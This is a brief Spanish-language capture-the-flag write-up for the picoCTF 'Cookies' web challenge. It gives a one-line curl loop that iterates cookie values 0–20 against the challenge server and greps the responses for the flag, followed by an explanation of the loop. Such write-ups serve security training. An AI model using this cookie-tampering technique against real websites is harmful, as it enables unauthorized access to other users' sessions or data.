## DESCRIPTION

Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:64944/](http://mercury.picoctf.net:64944/)
## HINT

(None)
## SOLUTION

![[Pasted image 20250326222642.png]]
Ponemos al iniciar sesión snickerdoodle (galleta que nos sugiere).

````

EduardoSanchez-picoctf@webshell:~$ for i in {0..20}; do curl http://mercury.picoctf.net:64944/check -H "Cookie: name=$i"; done | grep picoCTF


Se inicia un bucle que recorre los valores desde 0 a 20.

Para cada valor de i, realiza una solicitud HTTPO con un curl al sitio. Esto significa que la petición está enviando diferentes valores para la cookie name.

Se filtra la salida de todas las peticiones, solo muestra las lineas que contienen picoCTF, para obtener la flag. 
````

![[Pasted image 20250326224252.png]]
